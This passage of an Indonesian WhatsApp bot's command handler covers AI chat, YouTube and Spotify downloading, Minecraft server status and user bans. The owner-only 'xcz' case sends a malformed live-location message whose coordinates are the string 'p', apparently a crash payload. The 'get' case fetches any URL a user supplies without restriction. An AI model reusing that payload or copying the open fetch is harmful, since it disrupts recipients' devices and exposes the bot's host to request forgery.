    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error fetching data:", error);
    throw error;
  }
}

if (!text) return m.reply("masukkan teks")

const messages = [{
  role: 'system',
  content: `` // isi prompt sendiri
},
{
  role: 'user',
  content: text
},
];
try {
  let res = await chatBot(messages)
  let ress = res.choices[0].message.content
  m.reply(ress)
} catch (e) {
  await m.reply(`*AI Tidak Merespon 😑*`)
  console.log(e)
}
}
break

case 'gpt4_2': {
if (!text) return replygcyuta(`🍃 *Mau Nanya Apa Sama GPT4v2?*`)
replygcyuta('🍃 *Sabar Yaa*')
var Yutaai = await fetchJson(`https://widipe.com/v2/gpt4?text=${text}`)
 var lenai = Yutaai.result
await replygcyuta(lenai)
}
break

case 'islamiai': {
const { AnshariChat } = require('./lib/islami')
let h = new AnshariChat()
let hasil = await h.chat(text)
try {
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `--- *[ ɪsʟᴀᴍɪ-ᴀɪ ]* ---`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: hasil
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Apakah Gw Boleh Bertanya? Ai Islami\",\"id\":\"${xprefix}islamiai Apakah Gw Boleh Bertanya? Ai Islami\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: fnews })
await Yuta.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcyuta("`*Error*`")
}
}
break

case 'play': {
const ytdl2 = require('youtubedl-core')
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text) return replygcyuta(`Contoh : ${prefix + command} Zettai reido wind breaker`)

replygcyuta(mess.loading)
await LoadingReact()
let search = await yts(text)
let get = search.videos[0]
const vidId = ytdl.getURLVideoID(get.url)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let anu2 = `By Dev: ${ownername}\n\n`
anu2 += `${botname} [2023 - 2024]`

let capt = `┏⪻── *[ ʀ ᴇ ǫ ᴜ ᴇ s ᴛ - ᴘ ʟ ᴀ ʏ ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let playbt = [
 {
name: 'quick_reply',
buttonParamsJson: {
display_text: 'MP4⎙',
id: `.ytmp4 ${convert.url}`}
},
{
name: 'quick_reply',
buttonParamsJson: {
display_text: 'MP3⎙',
id: `.ytmp3 ${convert.url}`}
}]
await Yuta.sendButtonImg(m.chat, capt, anu2, null, convert.image, playbt, fnews, saluran, `Play By: ${ownername}
`)

await LoadingReact()
}
break



case 'play2': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text) return replygcyuta(`Contoh : ${prefix + command} Zettai reido wind breaker`)

replygcyuta(mess.loading)
await LoadingReact()
let search = await yts(text)
let get = search.videos[0]
const vidId = ytdl.getURLVideoID(get.url)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let capt = `┏⪻── *[ ʀ ᴇ ǫ ᴜ ᴇ s ᴛ - ᴠ ɪ ᴅ ᴇ ᴏ/ᴍ ᴜ s ɪ ᴄ ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let leo = {
  text: capt,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: convert.title,
      mediaType: 1,
      previewType: 1,
      body: convert.author.name,
      //previewType: "PHOTO",
      thumbnailUrl: convert.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: convert.url,
      sourceUrl: convert.url
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Yt Downloader By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });

//mp4
try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(convert.url)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: hasil.mp4.url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { youtube } = require('./lib/y2mate-kavian')
let hasil = await youtube(convert.url)
let get = hasil.download.dl
let result = await(await(get.mp4['360p']())).url
await Yuta.sendMessage(m.chat,{video:{url: result }, caption: captions },{quoted: fnews})
sendReaction('✅');
} catch (err) {
sendReaction('❌');
}}

//mp3
try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(convert.url)
sendReaction('✅');
let get = hasil.data
let leo = {
    audio: {
      url: hasil.mp3.url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (err) {
try {
const { youtube } = require('./lib/y2mate-kavian')
sendReaction('⏳');
let hasil = await youtube(convert.url)
let get = hasil.download
let result = await(await(get.dl.mp3['mp3']())).url
let leo = {
    audio: {
    url:result
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
sendReaction('✅');
} catch (err) {
sendReaction('❌');
}}

}
break

case 'playms': case 'playmusic': case 'playmusik': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text) return replygcyuta(`Contoh : ${prefix + command} Zettai reido wind breaker`)

replygcyuta(mess.loading)
await LoadingReact()
let search = await yts(text)
let get = search.videos[0]
const vidId = ytdl.getURLVideoID(get.url)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let capt = `┏⪻── *[ ʀ ᴇ ǫ ᴜ ᴇ s - ᴍ ᴜ s ɪ ᴄ ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let leo = {
  text: capt,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: convert.title,
      mediaType: 1,
      previewType: 1,
      body: convert.author.name,
      //previewType: "PHOTO",
      thumbnailUrl: convert.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: convert.url,
      sourceUrl: convert.url
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Yt Downloader By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });

try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(convert.url)
sendReaction('✅');
let get = hasil.data
let leo = {
    audio: {
      url: hasil.mp3.url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (err) {
try {
const { youtube } = require('./lib/y2mate-kavian')
sendReaction('⏳');
let hasil = await youtube(convert.url)
let get = hasil.download
let result = await(await(get.dl.mp3['mp3']())).url
let leo = {
    audio: {
    url:result
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
sendReaction('✅');
} catch (err) {
sendReaction('❌');
}}

}
break

case 'playvd': case 'playvideo': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text) return replygcyuta(`Contoh : ${prefix + command} Zettai reido wind breaker`)

replygcyuta(mess.loading)
await LoadingReact()
let search = await yts(text)
let get = search.videos[0]
const vidId = ytdl.getURLVideoID(get.url)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let capt = `┏⪻── *[ ʀ ᴇ ǫ ᴜ ᴇ s ᴛ - ᴠ ɪ ᴅ ᴇ ᴏ ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let leo = {
  text: capt,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: convert.title,
      mediaType: 1,
      previewType: 1,
      body: convert.author.name,
      //previewType: "PHOTO",
      thumbnailUrl: convert.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: convert.url,
      sourceUrl: convert.url
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Yt Downloader By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });

let captions = `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
captions += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
captions += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
captions += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
captions += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
captions += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
captions += `〆 ᴜʀʟ : ${convert.url}`

try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(convert.url)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: hasil.mp4.url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { youtube } = require('./lib/y2mate-kavian')
let hasil = await youtube(convert.url)
let get = hasil.download.dl
let result = await(await(get.mp4['480p']())).url
await Yuta.sendMessage(m.chat,{video:{url: result }, caption: captions },{quoted: fnews})
sendReaction('✅');
} catch (err) {
sendReaction('❌');
}}

}
break

case 'play3': {
if (!users.registered) return IsReg() 
const ytdl2 = require('youtubedl-core')
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text) return replygcyuta(`Contoh : ${prefix + command} Zettai reido wind breaker`)

replygcyuta(mess.loading)
await LoadingReact()
const { SearchSpotify } = require('./lib/spotify')
let hasil = await SearchSpotify(text)
let result = hasil.data[0]
await LoadingReact()
let getresult = await yts(text)
let convert = getresult.videos[0]

var anu2 = `Pilih Ya Mau Yang Mana ${text} 

${botname} [2023 - 2024]`

var captions = `┏┈┈┈「 *ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ ᴇ ʀ - ʏ ᴛ* 」┈┈┈┓
│› 📝ᴊᴜᴅᴜʟ : ${convert.title}
│› 💬ᴇxᴛ : Search
│› 🎬ɪᴅ : ${convert.videoId}
│› 🕒ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}
│› 🌐ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}
│› ⌛ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}
│› 👤ᴀᴜᴛʜᴏʀ : ${convert.author.name}
│› 🎯ᴄʜᴀɴɴᴇʟ : ${convert.author.url}
│› 📁ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}
│› 📎ᴜʀʟ : ${convert.url}
└──···

┏┈┈┈「 *ᴘ ʟ ᴀ ʏ - s ᴘ ᴏ ᴛ ɪ ғ ᴛ* 」┈┈┈┓
│› 📝ᴊᴜᴅᴜʟ : ${result.title}
│› 💬ᴇxᴛ : Search
│› 🌐popularity : ${result.popularity}
│› 📁ᴘʀᴇᴠɪᴇᴡ : ${result.preview}
│› 📎ᴜʀʟ : ${result.url}
└──···`;

let sections = [{
title: '<!> Pilih Type',
highlight_label: 'Downloader Yt Play',
rows: [{
title: 'Video📺',
description: `Displays Video📺`, 
id: `${prefix}ytmp4 ${convert.url}`
},
{
title: 'Audio🎧',
description: `Displays Audio🎧`, 
id: `${prefix}ytmp3 ${convert.url}`
},
]
}]

let listMessage = {
    title: 'Downloader Youtube⎙', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: saluran,
 newsletterName: ownername, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: Yuta.decodeJid(Yuta.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: anu2
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: captions,
 subtitle: ``,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image : { url : convert.thumbnail }}, { upload: Yuta.waUploadToServer})), 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Downloader Spotify⎙","id":"${xprefix}splay ${result.url}"}`
 },
 ],
 })
 })
 }
 }
}, { userJid: m.chat, quoted: fnews })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'get': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
  if (!/^https?:\/\//.test(text))
  return m.reply("Awali *URL* dengan http:// atau https://");
  const ajg = await fetch(text);
  if (ajg.headers.get("content-length") > 100 * 1024 * 1024 * 1024) {
    throw `Content-Length: ${ajg.headers.get("content-length")}`;
  }
  const contentType = ajg.headers.get("content-type");
  if (contentType.startsWith("image/")) {
    return Yuta.sendMessage(m.chat, { image: { url: text } });
  }
  if (contentType.startsWith("video/")) {
    return Yuta.sendMessage(m.chat, { video: { url: text } });
  }
  if (contentType.startsWith("audio/")) {
    return Yuta.sendMessage(m.chat, { audio: { url: text }, mimetype: "audio/mpeg"  });
  }
  let alak = await ajg.buffer();
  try {
    alak = util.format(JSON.parse(alak + ""));
  } catch (e) {
    alak = alak + "";
  } finally {
    m.reply(alak.slice(0, 65536));
  }
}
break

case 'xcz': {
if (!YutaTheCreator) return replygcyuta('Khusus Owner!!!')
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `${text ? text : ''}`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: fnews })
Yuta.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
break

case 'hyperxzbedrock': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
replygcyuta(mess.loading)
const Hyperxz = 'bedrock.hyperxz.id'

try {
const v = await fetchJson(`https://api.mcsrvstat.us/bedrock/3/${Hyperxz}`)

const f = `Player : ${v.online ? v.players.online : '0'} / ${v.online ? v.players.max : '0'}
Version : ${v.online ? v.version : 'Tidak Diketahui'}
Online : ${v.online ? 'Nyala' : 'Mati'}

IP And Port
IP : bedrock.hyperxz.id
Port : (19132) default`
replygcyuta(f)
} catch (err) {
replygcyuta(`${err}`)
}

}
break

case 'hyperxzjava': {
if (limituser < 1) return limitAbis();
useLimit(1)
replygcyuta(mess.loading)
const Hyperxz = 'hyperxz.id'

try {
const v = await fetchJson(`https://api.mcsrvstat.us/3/${Hyperxz}`)

const f = `Player : ${v.online ? v.players.online : '0'} / ${v.online ? v.players.max : '0'}
Version : ${v.online ? v.version : 'Tidak Diketahui'}
Online : ${v.online ? 'Nyala' : 'Mati'}

IP Java
IP : hyperxz.id`
replygcyuta(f)
} catch (err) {
replygcyuta(`${err}`)
}

}
break

case 'ban': {
  if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
  if (!text) return replygcyuta(`*perintah mu tidak benar, contoh  :*\n> *.${prefix + command} 62xxxxx*`)
  let orgnye = args[0] ? args[0] + "@s.whatsapp.net" : m.quoted.sender
  if (banned.includes(orgnye)) return replygcyuta(`*PERMINTAAN ERROR!! PESAN :*\n> *nomor ${args[0]} sudah ada didaftar banned*`)
  banned.push(orgnye)
  global.db.data.users[orgnye].banned = true
  fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
  replygcyuta(`*SUCCES!! PESAN :*\n> *nomor ${args[0]} telah dibanned*`)
}
break
case 'unban': {
  if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
  if (!text) return replygcyuta(`*perintah mu tidak benar, contoh  :*\n> *.${command} 62xxxxx*`)
  let orgnye = args[0] ? args[0] + "@s.whatsapp.net" : m.quoted.sender
  if (!banned.includes(orgnye)) return replygcyuta(`*PERMINTAAN ERROR!! PESAN :*\n> *nomor ${args[0]} belum di banned*`)
  const index = banned.indexOf(orgnye)
  if (index !== -1) banned.splice(index, 1)
  fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
  global.db.data.users[orgnye].banned = false
  replygcyuta(`*SUCCES!! PESAN :*\n> *nomor ${args[0]} telah diunbanned*`)
}
break
case 'mc': case 'server': {
if (!users.registered) return IsReg() 
if (limituser < 1) return limitAbis();
useLimit(1)
if (args.length == 0) return m.reply(`*Java / Bedrock*\n\n 
Pake IP Contoh\nJava\n.mc java hyperxz.id\nBedrock\n.mc bedrock bedrock.hyperxz.id:19132`)

try {
if (args[0] === 'bedrock') {
  replygcyuta(mess.loading)
  sendReaction("⏳")
  axios.get(`https://api.mcstatus.io/v2/status/bedrock/${args[1]}`).then(({ data }) => {
    var caption = `*〆 ᴍɪɴᴇᴄʀᴀғᴛ ʙᴇᴅʀᴏᴄᴋ sᴇʀᴠᴇʀ*\n`
    caption += ` *〆 ɪᴘ : ${data.host}*\n`
    caption += ` *〆 ᴘᴏʀᴛ : ${data.port}*\n`
    caption += `\n`
    caption += ` *〆 sᴇʀᴠᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ*\n`
    caption += ` *〆 ᴘʟᴀʏᴇʀ ᴏɴʟɪɴᴇ : ${data.players.online}/${data.players.max}*\n`
    caption += ` *〆 ɢᴀᴍᴇᴍᴏᴅᴇ : ${data.gamemode}*\n`
    caption += ` *〆 ᴇᴅɪᴛɪᴏɴ : ${data.edition}*\n`
    let buttonnya = [{
    name: 'cta_url',
    buttonParamsJson: {
    display_text: 'Link Cek Server',
    url: `https://mcstatus.io/status/bedrock/${args[1]}`,
    merchant_url: `https://mcstatus.io/status/bedrock/${args[1]}`
    }
    }]
    Yuta.sendButtonImgdf(m.chat, caption, botname, null, fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'), buttonnya, fnews, saluran, `Server Minecraft By; ${ownername}`);
  sendReaction("✅")
  })
} else if (args[0] === 'java') {
  sendReaction("⏳")
  replygcyuta(mess.loading)
axios.get(`https://api.mcstatus.io/v2/status/java/${args[1]}`).then(({ data }) => {
    var caption = `〆 *ᴍɪɴᴇᴄʀᴀғᴛ ᴊᴀᴠᴀ sᴇʀᴠᴇʀ*\n`
    caption += `*〆 ɪᴘ : ${data.host}*\n`
    caption += `*〆 ᴘᴏʀᴛ : ${data.port}*\n`
    caption += `\n`
    caption += `〆 *sᴇʀᴠᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ*\n`
    caption += `*〆 ᴘʟᴀʏᴇʀ ᴏɴʟɪɴᴇ : ${data.players.online}/${data.players.max}*\n`
    caption += `*〆 ᴠᴇʀsɪᴏɴ : ${data.version.name_clean}*\n`
    let buttonnya = [{
    name: 'cta_url',
    buttonParamsJson: {
    display_text: 'Link Cek Server',
    url: `https://mcstatus.io/status/java/${args[1]}`,
    merchant_url: `https://mcstatus.io/status/java/${args[1]}`
    }
    }]
    Yuta.sendButtonImgdf(m.chat, caption, botname, null, fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'), buttonnya, fnews, saluran, `Server Minecraft By; ${ownername}`);
  sendReaction("✅")
  })
}
} catch (err) {
let error = `Server Gak Di Temukan Atau Ga Lagi Eror\n`
error += `\n\n`
error += `${err}`
replygcyuta(`${error}`)
sendReaction("❌")
}}
break

case 'simi': case 'simi-simian': {
if (!users.registered) return IsReg() 
if (!text) throw `*Example:* ${usedPrefix + command} hello`

    const data = new URLSearchParams();
    data.append('text', text);
    data.append('lc', 'id');
    data.append('=', '');

    const config = {
      method: 'post',
      url: 'https://simsimi.vn/web/simtalk',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest'
      },
      data: data
    };

let { data: result } = await axios(config)
await replygcyuta(result.success)
}
break

case 'delsesi': 
  case 'clearsession': {
fs.readdir(`./${sessionName}`, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replygcyuta('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replygcyuta(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replygcyuta(`${teks}`) 
await sleep(2000)
replygcyuta("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${sessionName}/${file}`)
});
await sleep(2000)
replygcyuta("Berhasil menghapus semua Kenangan di folder session")     
});
}
break

case 'ytmp3': case 'ytaudio': case 'yta': {
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)

if (limituser < 1) return limitAbis();
useLimit(1)
if (!text.includes('youtu')) return replygcyuta(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)

await LoadingReact()
const vidId = ytdl.getURLVideoID(text)
let get = `https://i.ytimg.com/vi/${vidId}/maxresdefault.jpg`
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let capt = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - ʏ ᴛ ᴍ ᴘ 3 ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let leo = {
  text: capt,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: convert.title,
      mediaType: 1,
      previewType: 1,
      body: convert.author.name,
      //previewType: "PHOTO",
      thumbnailUrl: convert.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: convert.url,
      sourceUrl: convert.url
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Yt Downloader By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });

await downloadMp3(convert.url)
}
break

case 'ytmp4': case 'ytvideo': case 'ytv': {
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
if (limituser < 1) return limitAbis();
useLimit(1)
if (!text.includes('youtu')) return replygcyuta(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)

await LoadingReact()
const vidId = ytdl.getURLVideoID(text)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let capt = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - ʏ ᴛ ᴍ ᴘ 4 ]* ──⪼┓\n`
capt += `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
capt += `〆 ᴇxᴛ : sᴇᴀʀᴄʜ\n`
capt += `〆 ɪᴅ : ${convert.videoId}\n`
capt += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
capt += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
capt += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
capt += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
capt += `〆 ᴄʜᴀɴɴᴇʟ : ${convert.author.url}\n`
capt += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
capt += `〆 ᴜʀʟ : ${convert.url}\n`
capt += `┗⪻─────────────────────────⪼┛`

let leo = {
  text: capt,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
